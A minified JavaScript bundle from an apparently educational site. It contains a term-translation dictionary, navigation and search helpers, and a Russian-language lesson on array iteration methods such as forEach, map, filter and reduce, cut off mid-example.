система"),"document","документ"),"graph","граф"),r(r(r(r(r(r(r(r(r(r(t,"replication","репликация"),"scrolling","прокрутка"),"coordinates","координаты"),"width","ширина"),"height","высота"),"class","класс"),"strict mode","строгий режим"),"octal","восьмеричный"),"syntax","синтаксис"),"short","краткий"),r(r(r(r(r(r(r(r(r(r(t,"declaration","объявление"),"directive","директива"),"application","приложение"),"spoiler","spoiler"),"slider","слайдер"),"drop-down menu","выпадающее меню"),"drop-down","выпадающее"),"data","данные"),"client","клиент"),"save on the client","сохранить на клиенте"),r(r(r(r(r(r(r(r(r(r(t,"store on the client","сохранить на клиенте"),"clear","очистить"),"save","сохранить"),"store","сохранить"),"add","добавить"),"append","добавить"),"delete","удалить"),"remove","удалить"),"page","страница"),"layout","разметка страницы"),r(r(r(r(r(r(r(r(r(r(t,"markup","шаблон разметки страницы"),"fragment","фрагмент"),"attribute","атрибут"),"key","ключ"),"local","локальный"),"text","текст"),"upload","загрузить"),"download","скачать"),"uploading a file to the server","загрузка файла на сервер"),"dump","дамп"),r(r(r(r(r(r(r(r(r(r(t,"status","состояние"),"chat","чат"),"destructuring","деструктуризация"),"destructuring assignment","деструктурирующее присваивание"),"rest","остаток"),"generator","генератор"),"iterator","итератор"),"asynchronous","асинхронный"),"asynchronous generators","асинхронный генератор"),"indexing","индексация"),r(r(r(r(r(r(r(r(r(r(t,"index","индекс"),"package manager","пакетный менеджер"),"command line",""),"interpreter","интерпретатор"),"symlink","символическая ссылка"),"integrity","целостность"),"version","версия"),"ver","версия"),"dependency","зависимость"),"dependencies","зависимости"),r(r(r(r(r(r(r(r(r(r(t,"file","файл"),"file type","тип файла"),"file size","размер файла"),"font","шрифт"),"embedding","встраивание"),"named","именованный"),"named export","именованный экспорт"),"web component","веб-компонент"),"component","компонент"),"slot","слот"),r(r(r(r(r(r(r(r(r(r(t,"package","пакет"),"path","путь"),"port","порт"),"datagram","дейтаграмма"),"font embedding","подключение шрифтов"),"command-line utility","утилита командной строки"),"module","модуль"),"build","сборка"),"builder","сборщик"),"bundle","бандл"),r(r(r(r(r(r(r(r(r(r(t,"config","конфигурация"),"import","импорт"),"export","экспорт"),"dynamic import","динамический импорт"),"deployment","развертывание"),"snapshot","слепок"),"install","установить"),"installation","установка"),"caching","кэширование"),"debouncing","устранение дребезга"),r(r(r(r(r(r(r(r(r(r(t,"throttling","дросселирование"),"performance","производительность"),"memory","память"),"notification","уведомление"),"desktop","рабочий стол"),"user","пользователь"),"storage","хранилище"),"game","игра"),"characters","персонажи"),"insert","вставить"),r(t,"registration","регистрация"))},59845:(n,e,_)=>{"use strict";_.r(e),_.d(e,{ua:()=>t});var t=["404","API","Array-iterating-methods-theory","Array-iterating-methods","arrayBuffer","arrow-function","async-await","Block-diagram","Boolean","Chrome-dev-tools","data-structures","dynamic-import","Event-Loop","for","function","JSON","pattern-Observer","pattern-Strategy","promise","start-page","Timers","var","while"]},38045:(n,e,_)=>{"use strict";_.r(e),_.d(e,{getKeywords:()=>o});var t=_(37953).default.keywords;function o(){return t}},82133:(n,e,_)=>{"use strict";_.r(e),_.d(e,{getLesson:()=>o});var t=_(82627).default;function o(){var n=[t.pages,t[self.lang]],e=n[0];return n[1].includes(self.currentLesson)?_(78137)("./"+self.lang+"/"+self.currentLesson+".md").default:e.includes(self.currentLesson)?_(3674)("./"+self.lang+"/404.md").default:_(33708).default}},97655:(n,e,_)=>{"use strict";_.r(e),_.d(e,{getMainMenu:()=>i});var t=_(37953).default.mainMenu,o=_(82627).default,r=o.pages,s=o.ua,a=o.eng;function i(){return t.map((function(n){return{ref:n.ref,title:n[self.lang],items:n.items.filter((function(n){return r.includes(n.ref)})).map((function(n){return{ref:n.ref,title:n[self.lang],translated:a.includes(n.ref)&&s.includes(n.ref)}}))}}))}},44577:(n,e,_)=>{"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}function o(n,e,_){return(e=function(n){var e=function(n){if("object"!=t(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=t(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==t(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}function r(n){return function(n){if(Array.isArray(n))return s(n)}(n)||function(n){if("undefined"!=typeof Symbol&&null!=n[Symbol.iterator]||null!=n["@@iterator"])return Array.from(n)}(n)||function(n,e){if(n){if("string"==typeof n)return s(n,e);var _={}.toString.call(n).slice(8,-1);return"Object"===_&&n.constructor&&(_=n.constructor.name),"Map"===_||"Set"===_?Array.from(n):"Arguments"===_||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(_)?s(n,e):void 0}}(n)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function s(n,e){(null==e||e>n.length)&&(e=n.length);for(var _=0,t=Array(e);_<e;_++)t[_]=n[_];return t}_.r(e),_.d(e,{default:()=>l});var a=_(90131),i=a.keys().filter((function(n){return"./"!==n&&"./index"!==n&&"./index.js"!==n})),c=Object.assign.apply(Object,[{}].concat(r(i.map((function(n){return o({},n.split("./").join("").split(".js").join(""),a(n))})))));const l=Object.assign.apply(Object,[{}].concat(r(Object.keys(c).map((function(n){return o({},n,c[n][n])})))))},10194:(n,e,_)=>{"use strict";function t(n){return n.match(/^[#]{1,6}.*/gm).map((function(n){return{level:n.match(/^[#]{1,6}/)[0].length,text:n.slice(n.match(/^[#]{1,6}/)[0].length)}})).map((function(n){var e=[n.text.match(/!\[.[^\]]+\]/g),n.text.match(/\[.[^(]+\]\(.[^\)]+\)/g)][0];return e&&e.forEach((function(e){n.text=n.text.replace(e,"").trim()})),n}))}_.r(e),_.d(e,{parseHeaders:()=>t})},16829:(n,e,_)=>{"use strict";function t(n){return n.split("").filter((function(n){return n.charCodeAt(0)>=97&&n.charCodeAt(0)<=122})).length}_.r(e),_.d(e,{engChars:()=>t})},57246:(n,e,_)=>{"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}function o(n,e,_){return(e=function(n){var e=function(n){if("object"!=t(n)||!n)return n;var e=n[Symbol.toPrimitive];if(void 0!==e){var _=e.call(n,"string");if("object"!=t(_))return _;throw new TypeError("@@toPrimitive must return a primitive value.")}return String(n)}(n);return"symbol"==t(e)?e:e+""}(e))in n?Object.defineProperty(n,e,{value:_,enumerable:!0,configurable:!0,writable:!0}):n[e]=_,n}function r(n){return function(n){if(Array.isArray(n))return s(n)}(n)||function(n){if("undefined"!=typeof Symbol&&null!=n[Symbol.iterator]||null!=n["@@iterator"])return Array.from(n)}(n)||function(n,e){if(n){if("string"==typeof n)return s(n,e);var _={}.toString.call(n).slice(8,-1);return"Object"===_&&n.constructor&&(_=n.constructor.name),"Map"===_||"Set"===_?Array.from(n):"Arguments"===_||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(_)?s(n,e):void 0}}(n)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function s(n,e){(null==e||e>n.length)&&(e=n.length);for(var _=0,t=Array(e);_<e;_++)t[_]=n[_];return t}_.r(e),_.d(e,{default:()=>l});var a=_(1130),i=a.keys().filter((function(n){return"./"!==n&&"./index"!==n&&"./index.js"!==n})),c=Object.assign.apply(Object,[{}].concat(r(i.map((function(n){return o({},n.split("./").join("").split(".js").join(""),a(n))})))));const l=Object.assign.apply(Object,[{}].concat(r(Object.keys(c).map((function(n){return o({},n,c[n][n])})))))},73512:(n,e,_)=>{"use strict";function t(n){return n.split("").filter((function(n){return n.charCodeAt(0)>=1072&&n.charCodeAt(0)<=1103})).length}_.r(e),_.d(e,{ruChars:()=>t})},45220:(n,e,_)=>{"use strict";_.r(e),_.d(e,{translate:()=>r});var t=_(73512),o=_(82627).default.translations;function r(n){return(0,t.ruChars)(n)>0?Object.keys(o).find((function(e){return o[e].includes(n)})):n}},48429:(n,e,_)=>{"use strict";function t(n){return ruChars(n)+n.split("").filter((function(n){return["ґ","є","ї","і"].includes(n)})).length}_.r(e),_.d(e,{uaChars:()=>t})},46293:(n,e,_)=>{"use strict";_.r(e),_.d(e,{search:()=>r});var t=_(97655),o=(_(57246).default.translate,_(37953).default.keywords);function r(n){var e=(0,t.getMainMenu)();if(!n)return self.postMessage({route:"main-menu",response:(0,t.getMainMenu)()});var _=Object.keys(o).filter((function(e){return o[e].filter((function(e){return e.includes(n)})).length})),r=e.map((function(n){return Object.assign(n,{items:n.items.filter((function(n){return _.includes(n.ref)}))})})).filter((function(n){return n.items.length}));self.postMessage({route:"main-menu",response:r})}},33708:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\n#![ico-70 warn] 404\n# Page does not exist.\n<br>\n<br>\n<br>\nНа жаль, запитаний вами матеріал не знайдено або не існує.\nЗверніться до розробника: **irina.h.fylyppova@gmail.com**\n_____________________________\nUnfortunately, the material you've requested was not found or does not exist.\nPlease contact the developer: **irina.h.fylyppova@gmail.com**\n_____________________________\nК сожалению, запрошенный вами материал не найден или не существует.\nОбратитесь к разработчику: **irina.h.fylyppova@gmail.com**\n_____________________________\n<br>\n<br>\n"},28718:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Итерирующие методы массивов\n\n_____________________________________________________\n\n[►►►Принцип работы►►►](page/Array-iteration-methods-theory.md)\n\n_____________________________________________________\n\n### ![ico-25 icon] forEach()\n\n![ico-20 warn] Этот метод не возвращает никакого значения\nОн просто вызывает переданную ему функцию с каждым элементом массива\n^^Функция-аргумент метода имеет три формальных параметра^^\n^^Первый - обязательный, два других - опциональные^^\n^^1) текущий элемент массива^^\n^^2) идекс текущего элемента массива^^\n^^3) сам итерируемый массив^^\n\n____________\n\n^^Рассмотрим самый простой вариант использования метода **~forEach()~**^^\n\n◘◘![ico-20 cap] **forEach (1)**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach((currentValue, index, array) => console.log(`${index}: ${currentValue}`))\n~~~\n\n^^Здесь мы итерируем массив  **people**  с помощью метода  **~forEach~**^^\n^^Методу  **~forEach~**  в качестве аргумента  передается анонимная функция:^^\n\n~~~js\n(currentValue, index, array) => console.log(`${index}: ${currentValue}`)\n~~~\n\n^^У этой анонимной функции может быть  три аргумента:^^\n^^1) текущий элемент массива^^\n^^2) идекс текущего элемента массива^^\n^^3) сам итерируемый массив^^\n\n^^Обязательным является только первый аргумент^^\n\n^^Например, чтобы вывести в консоль все элементы массива  **people**, мы можем использовать метод  **~forEach~** следующим образом:^^\n\n~~~js\npeople.forEach(x => console.log(x))\n~~~\n\nРезультат работы предыдущего кода будет идентичен результату работы обычного оператора ~for ... of~:\n\n~~~js\nfor (const x of people) console.log(x)\n~~~\n\n__________________________________________\n\n^^Для чего могут понадобиться второй и третий аргументы анонимной функции:^^\n\n^^предположим, нам нужно произвести вычисления с участием индекса элемента массива^^\n^^при этом мы хотим добавить результаты вычислений в исходный массив ( изменить его )^^\n\n◘◘![ico-25 cap] **forEach (2)**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7], res = []\n\nnumbers.forEach((numb, ind, res) => res.push(numb * ind))\n\nconsole.log(numbers) // [ 8, 4, 9, 7, 0, 4, 18, 21 ]\n~~~\n\n^^или мы хотим удвоить все значения элементов масива:^^\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\n\nnumbers.forEach((numb, ind, res) => res[ind] = numb * 2)\n\nconsole.log(numbers) // [ 16, 8, 18, 14 ]\n~~~\n\n^^т.е. исходный массив  **numbers**  был изменен^^\n^^Теперь получим результаты вычислений в новый массив  **res**^^\n\n~~~js\nconst  numbers = [8, 4, 9, 7], res = []\n\nnumbers.forEach((numb, ind) => res.push(numb * ind))\n\nconsole.log(res)\nconsole.log(numbers)\n~~~\n\n^^Теперь  результаты вычислений будут помещены в массив  **res**,  а исходный  массив  **numbers**  останется неизмененным^^\n\n_________________________________________________\n\n^^^[Контекст вызова]\n\nМетод  **~forEach~**  может принимать дополнительный аргумент - ссылку на контект вызова\n![ico-20 warn] Однако при этом функция, передаваемая методу в качестве аргумента, не должна быть стрелочной\n\n\n◘◘![ico-25 cap] **forEach (3)**◘◘\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(function (interval) { console.log(this) }, intervals)\n~~~\n\n^^В результате выполнения этого кода в консоли будет массив **~intervals~**^^\n^^Фактически передача методу второго аргумента равносильна биндингу контекста:^^\n\n~~~js\nintervals.forEach(function (interval) { console.log(this) }.bind(intervals))\n~~~\n\n^^Поэтому при использовании стрелочной функции:^^\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(interval => console.log(this), intervals)\n~~~\n\n^^контекст которой изменить невозможно, в консоли мы увидим объект **~window~**^^\n\n^^^\n\n_____________________\n\n^^^[forEach (4)]\n\n^^Предположим, мы хотим передавать ссылку на массив **~res~**, куда следует помещать результаты вычислений:^^\n\n~~~js\nconst res = []\n\nnumbers.forEach(function (numb, ind) {\n  this.push(numb * ind)\n}, res)\n~~~\n\n^^Чтобы обеспечить гибкость, т.е. возможность динамически изменять контекст вызова, а не устанавливать его единожды и навеки, завернем метод **~forEach~** в функцию  **~createNewArray~**^^\n\n^^У функции **~createNewArray~** будет два формальных параметра:^^\n^^   - исходный массив     ( **_~sourseArray~_** )^^\n^^   - массив результатов ( **_~resultArray~_** )^^\n\n^^Функция **~createNewArray~** будет передавать методу **~forEach~** не только функцию, которая будет вызвана на каждой итерации цикла, но и ссылку на контекст вызова этой функции ( ~this~ )^^\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\nconst res = []\n\nfunction createNewArray (sourseArray, resultArray) {\n  sourseArray.forEach(function (numb, ind) {\n    this.push(numb * ind)\n  }, resultArray)\n}\n\ncreateNewArray(numbers, res)\nconsole.log(res)\nconsole.log(numbers)\n~~~\n\n^^В момент вызова значение формального параметра **~resultArray~** будет ссылкой на массив **~res~**^^\n^^Таким образом, в результате вызова:^^\n\n~~~js\ncreateNewArray(numbers, res)\n~~~\n\n^^внутри функции, передаваемой методу **~forEach~** в качестве первого аргумента, ~this~  будет указывать на массив  **~res~**^^\n\n^^Теперь функция  **~createNewArray~**  может быть применена к различным массивам:^^\n\n~~~js\nconst bug = [10, 1, 3, 8]\nconst fug = []\n\ncreateNewArray(bug, fug)\n~~~\n\n^^^\n\n_____________________\n\n^^^[forEach (5)]\n\n~~~js\n['zero', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine']\n  .forEach((item, index) => Object.assign(window, {\n      [item]: arg => typeof arg === 'function' ? arg(index) : index\n  }))\n~~~\n\nВ этом примере мы создаем с помощью метода **forEach** массив функций с именами\n\"zero\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\"\n\nКаждая из этих функций проверяет тип переданного ей аргумента **_arg_**,\nи если это ~function~, то вызывает **_arg_**,\nпередавая ей в качестве аргумента свой порядковый номер (0, 1, 2 ...),\nв противном случае возвращает число - свой порядковый номер (0, 1, 2 ...)\n\n~~~js\nzero(Math.sin)  // 0\nzero(Math.cos)  // 1\n\nfour(Math.sqrt) // 2\nnine(Math.sqrt) // 3\n\nnine()  // 9\n~~~\n\n^^^\n\n\n^^^[forEach (6)]\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .forEach((item, index) => Object.assign(window, {\n    operations: ['+', '-', '/', '*'],\n    [item]: function () {\n      return arguments.length === 2\n        ? eval(`arguments[0] ${this.operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\nВ этом примере мы создаем еще один массив функций с именами \"plus\", \"minus\", \"divide\", \"multiply\"\nКаждая из этих функций имеет два формальных параметра,\nпоэтому первым делом она проверяет длину объекта arguments,\nи если длина равна 2, то выполняет соответствующую операцию с аргументами\n(складывает, вычитает, умножает, делит),\n\n~~~js\nminus(7, 2)    // 5\n\ndivide(9, 3)   // 3\n\nmultiply(5, 3) // 15\n~~~\n\nв протичном случае возвращает каррированную функцию,\nу которой первый аргумент уже \"прошит\",\nи которую можно вызывать с одним (недостающим вторым) аргументом\n\n~~~js\nmultiply(5)(3)  // 15\n\ndivide(9)(3)\n~~~\n\nТеперь мы можем использовать первую группу функций в сочетании с функциями второй группы:\n\n~~~js\nseven(plus(two()))        // 9\n\nfive(minus(nine()))       // 4\n\nthree(multiply(eight()))  // 24\n~~~\n\n^^^\n____________________\n\n^^^[Упражнение (forEach)]\n\n^^Разберитесь самостоятельно, что делает следующий код:^^\n\n~~~js\nconst callback = rule => console.log(rule)\n\nArray.from(document.styleSheets)\n  .forEach(sheet => sheet.href && Array.from(sheet.cssRules).forEach(callback))\n~~~\n\n^^^\n\n______________________\n\n### ![ico-25 icon] map()\n\nЭтот метод вызвращает новый массив, полученный из элементов исходного массива  после применения к каждому из них  функции, переданной методу в качестве аргумента\n\nФункция, передаваемая в качестве аргумента метода, должна возвращать новое значение ( обязательно должен присутствовать оператор  ~return~ )\n\nЗначение, возвращаемое функцией на каждой итерации, будет помещаться в результирующий массив\n\n◘◘![ico-20 cap] **map (1)**◘◘\n\n~~~js\nvar first = [8, 4, 9, 7]\n\nvar res = first.map(currentValue => currentValue * 2)\n\nconsole.log(res)\n~~~\n\n^^В этом примере в массив  **res**  попадут все удвоенные значения элементов исходного массива  **first**^^\n\nТак же, как и в методе **~forEach()~**,  в  методе  **~map()~**  передаваемая методу в качестве аргумента  функция может принимать три аргумента\n\n~~~js\nfunction (currentValue, index, arr) {\n  console.log(arr)\n  return  currentValue * index\n}\n~~~\n\nВторой  и третий  аргументы необязательны, и имеют то же содержание, что и в методе **~forEach()~**\n\n![ico-20 green-ok] Аргумент  **arr**  будет содержать ссылку на исходный массив, к которому применяется метод\n![ico-20 green-ok] Аргумент  **index**  - это счетчик итераций, или индекс текущего элемента итерируемого массива\n\n______________________________________________\n\nПерейдите по [![ico-20 link] **_ссылке_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018)\n\nВ консоли новой вкладки выполните код:\n\n◘◘![ico-20 cap] **map (2)**◘◘\n\n~~~js\nlocation.search\n  .slice(1).split(',')\n  .map(x => ({ [x.split('=')[0]] : x.split('=')[1] }))\n~~~\n\nУ вас должен получиться результат:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: \"garevna\"}\n  ► 1: {date: \"10.07.2018\"}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n______________________________________________\n\nПерейдите по [![ico-20 link] **_ссылке_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018)\n\nТеперь в консоли новой вкладки объявите функцию:\n\n◘◘![ico-20 cap] **map (3)**◘◘\n\n~~~js\nfunction getSearchObject () {\n  var obj = {}\n  location.search.slice(1).split(',')\n    .map(x => x.split('='))\n    .map (function (item) { this[item[0]] = item[1] }, obj)\n  return obj\n}\n~~~\n\nВызовите функцию  **getSearchObject()**\n\nУ вас должен получиться результат:\n\n~~~console\n▼ {name: \"garevna\", date: \"10.07.2018\"}\n    date: \"10.07.2018\"\n    name: \"garevna\"\n  ► __proto__: Object\n~~~\n\n______________________________________________\n\n◘◘![ico-20 cap] **map (4)**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .map((item, index) => window[item] = function () {\n    const operations = ['+', '-', '/', '*']\n\n    return arguments.length === 2\n      ? eval(`arguments[0] ${operations[index]} arguments[1]`)\n      : window[item].bind(null, arguments[0])\n  })\n~~~\n\n______________________________________________\n\n◘◘![ico-20 cap] **map (5)**◘◘\n\n~~~js\nconst funcs = [\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 1\n    for (const arg of arguments) res *= parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseInt(arg) || 0\n    return res\n  }\n]\n\nFunction.prototype.currying = function (arg, context) {\n  return this.bind(context, arg)\n}\n\nfuncs\n  .map(func => func.currying(2.5))\n  .map(func => func.currying(2))\n  .map(func => func.currying(4.5))\n  .map(func => func())\n~~~\n\n~~~console\n▼ (3) [9, 22.5, 8]\n    0: 9\n    1: 22.5\n    2: 8\n    length: 3\n  ► [[Prototype]]: Array(0)\n~~~\n__________________________\n\n### ![ico-25 icon] filter()\n\nМетод **~filter()~** итерирует массив, проверяя выполнение заданного условия для каждого элемента массива\nМетод возвращает новый массив\nВ результирующий массив попадут только те элементы, которые удовлетворяют условию фильтрации\n\n◘◘![ico-20 cap] **filter**◘◘\n\n~~~js\nvar sourceArray = [\n  { name: 'Николай Василенко', country: 'Украина' },\n  { name: 'Дюк Шейн', country: 'США' },\n  { name: 'Демид Швейк', country: 'Франция' },\n  { name: 'Семен Картко', country: 'Украина' },\n  { name: 'Маргарет Джонсон', country: 'США' },\n  { name: 'Филипп Данько', country: 'Украина' },\n  { name: 'Роберт Трамп', country: 'США' },\n]\n\nvar usa = sourceArray.filter(x => x.country === 'США')\n\nconsole.log(usa)\n\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {name: \"Дюк Шейн\", country: \"США\"}\n  ► 1: {name: \"Маргарет Джонсон\", country: \"США\"}\n  ► 2: {name: \"Роберт Трамп\", country: \"США\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n_________________________________\n\n### ![ico-25 icon] find()\n\nМетод ищет в массиве и возвращает первый найденный элемент, удовлетворяющий заданному условию\n\nЕсли такого элемента в массиве нет, возвращает ~undefined~\n\n◘◘![ico-20 cap] **find (1)**◘◘\n\n~~~js\nvar cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.find(card => card.cash > 4000)\n~~~\n\n^^Этот код вернет объект^^\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ { num: \"457811714\", cash: 5000 }\n    cash: 5000\n    num: \"457811714\"\n  ► __proto__: Object\n\n~~~\n\n___________________________\n\nПопробуйте самостоятельно разобраться, что будет делать функция **getTransactionMode**:\n\n◘◘![ico-20 cap] **find (2)**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const operations = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (operation) {\n    for (const mode in operations) {\n      const res = operations[mode]\n        .find(item => item === operation)\n      if (res) return mode\n    }\n    return null\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________\n\n### ![ico-25 icon] findIndex()\n\nПодобно методу ~find()~, ищет в массиве первый элемент, удовлетворяющий заданному условию\nОднако возвращает не сам элемент, а его индекс\n\nЕсли такого элемента в массиве не обнаружено, возвращает **-1**\n\n◘◘![ico-20 cap] **findIndex**◘◘\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.findIndex(card => card.cash > 1500)  // 1\n~~~\n\n_______________________\n\n### ![ico-25 icon] every()\n\nОсуществляет проверку массива на предмет вхождения элементов, не удовлетворяющих заданному условию\n\nВозвращает логическое значение:\n  • если все элементы массива благополучно прошли проверку - ~true~\n  • если хотя бы один элемент не прошел проверку - ~false~\n\nФункция, передаваемая методу в качестве первого аргумента, проверяет выполнение заданного условия для каждого элемента массива, и возвращает логическое значение\n\nМассив итерируется до тех пор, пока функция не вернет значение ~false~\nВ этом случае метод вернет ~false~\n\nЕсли функция вернет ~true~ для всех элементов массива, метод вернет ~true~\n\n◘◘![ico-20 cap] **every**◘◘\n\n~~~js\nconst people = [\n  { name: 'Николай Василенко', country: 'Украина' },\n  { name: 'Дюк Шейн', country: 'США' },\n  { name: 'Демид Швейк', country: 'Франция' },\n  { name: 'Семен Картко', country: 'Украина' },\n  { name: 'Маргарет Джонсон', country: 'США' },\n  { name: 'Филипп Данько', country: 'Украина' },\n  { name: 'Роберт Трамп', country: 'США' },\n]\n\nconst res = people.every(x => x.country === 'Украина')\n\nconsole.log(res)\n~~~\n\n^^В этом примере массив  **people**  проверяется на наличие в нем жителей не Украины^^\n^^Переменная  **res**  будет иметь значение ~false~, поскольку в массиве есть элементы, не удовлетворяющие заданному условию^^\n\n______________________________________________\n\n### ![ico-25 icon] some()\n\nОсуществляет поиск в массиве по заданному условию\n\nВозвращает логическое значение (найдено / не найдено)\n\nФункция, передаваемая методу в качестве первого аргумента, проверяет выполнение заданного условия для каждого элемента массива, и возвращает логическое значение\n\nМассив итерируется до тех пор, пока функция не вернет значение ~true~\nВ этом случае метод вернет  ~true~\n\nЕсли функция вернет ~false~ для всех элементов массива, метод вернет ~false~\n\n◘◘![ico-20 cap] **some**◘◘\n\n~~~js\nconst people = [\n  { name: 'Николай Василенко', country: 'Украина' },\n  { name: 'Дюк Шейн', country: 'США' },\n  { name: 'Демид Швейк', country: 'Франция' },\n  { name: 'Семен Картко', country: 'Украина' },\n  { name: 'Маргарет Джонсон', country: 'США' },\n  { name: 'Филипп Данько', country: 'Украина' },\n  { name: 'Роберт Трамп', country: 'США' },\n]\n\nconst res = people.some(x => x.country === 'Пакистан')\n\nconsole.log(res)\n~~~\n\n^^В этом примере массив  **people**  проверяется на наличие в нем жителей Пакистана^^\n^^Переменная  **res**  будет иметь значение `false`, поскольку таких \"персонажей\" в массиве нет^^\n\n^^Метод **some** можно заменить следущим кодом:^^\n\n~~~js\nconst res = people\n  .map(human => human.country)\n  .includes('Украина')\n~~~\n\n____________________________\n\n### ![ico-25 icon] reduce()\n\nСводит массив к новому результату\n\nЭтот метод получает два аргумента:\n  • обязательный первый аргумент - функция, которая будет вызвана для каждого элемента массива\n  • опциональный второй аргумент - стартовое значение переменной-аккумулятора\n\nФункция, которая передается методу в качестве первого ( обязательного ) аргумента, имеет два обязательных формальных параметра:\n\n• первый: имя переменной-аккумулятора, в которой будет накапливаться результат работы метода\n• второй: текущий элемент массива\n\n![ico-20 warn] Если стартовое значение аккумулятора не установлено,\nв качестве стартового значения аккумулятора будет использовано значение первого элемента массива,\nи на каждой итерации второй аргумент будет следующим элементом массива\n\n◘◘![ico-20 cap] **reduce (1)**◘◘\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => {\n  document.body.innerHTML += `<p>${accumulator} : ${item}</p>`\n  return accumulator += item\n})\n~~~\n\n{{{Array-iteration-methods-reduce-1.js}}}\n\n___________________\n\n\nМетод может возвращать данные любого типа, например, объект:\n\n◘◘![ico-20 cap] **reduce (2)**◘◘\n\n~~~js\n['first', 'second', 'third', 'fourth']\n  .reduce((res, item, index) => {\n    res[item] = index + 1\n    return res\n  }, {})\n~~~\n\n{{{Array-iteration-methods-reduce-2.js}}}\n\n\nили массив:\n\n◘◘![ico-20 cap] **reduce (3)**◘◘\n\n~~~js\nconsole.log(['first', 'second', 'third', 'fourth']\n  .reduce((res, item, index, arr) => {\n    res[index] = arr[arr.length - index - 1]\n    return res\n  }, []))\n~~~\n\n{{{Array-iteration-methods-reduce-3.js}}}\n\n_____________________________\n\nФункция, передаваемая методу **reduce** в качестве первого обязательного аргумента,\nкак и в случае других итерирующих методов, может принимать дополнительные аргументы -\nиндекс текущего элемента массива и ссылку на сам исходный массив\nБлагодаря ссылке, мы можем манипулировать исходным массивом, что делает его мутабельным\nПосмотрим, что будет происходить, если в процессе итерирования массива мы будем изменять его длину:\n\n◘◘![ico-20 cap] **reduce (4)**◘◘\n\n~~~js\nconsole.log(['first', 'second', 'third', 'fourth']\n  .reduce((res, item, index, arr) => {\n    res.push(arr.pop())\n    return res\n  }, []))\n~~~\n\n{{{Array-iteration-methods-reduce-4.js}}}\n\n◘◘![ico-20 cap] **reduce (5)**◘◘\n\n~~~js\nconsole.log(['first', 'second', 'third', 'fourth']\n  .reduce((res, item, index, arr) => {\n    res.push(arr.shift())\n    return res\n  }, []))\n~~~\n\n{{{Array-iteration-methods-reduce-5.js}}}\n\n_____________________________________\n\nПроследим, как будет работать метод **reduce**, если передать ему первым аргументом **Math.sqrt**\nБиблиотечная функция **Math.sqrt** принимает всего 1 аргумент ( число ), и возвращает квадратный корень из полученного числа\nЕсли мы не передаем методу **reduce** стартовое значение аккумулятора, он будет использовать значение первого элемента массива\nНа каждой итерации это значение будет заменяться его квадратным корнем\nОстальные элементы массива в вычислениях участвовать не будут, поскольку **Math.sqrt** принимает всего 1 аргумент, и это будет текущее значение переменной-аккумулятора\nИтераций будет столько, сколько элементов в массиве\nТаким образом, результатом работы метода **reduce** будет квадратный корень из квадратного корня... и т.д. первого элемента исходного массива\n\n\n◘◘![ico-20 cap] **reduce (6)**◘◘\n\n~~~js\nconsole.log([625, 5, 10].reduce(Math.sqrt))\nconsole.log([625, 8, 3].reduce(Math.sqrt))\nconsole.log([625, 4].reduce(Math.sqrt))\nconsole.log([81, 7, 5].reduce(Math.sqrt))\nconsole.log([81, 0, 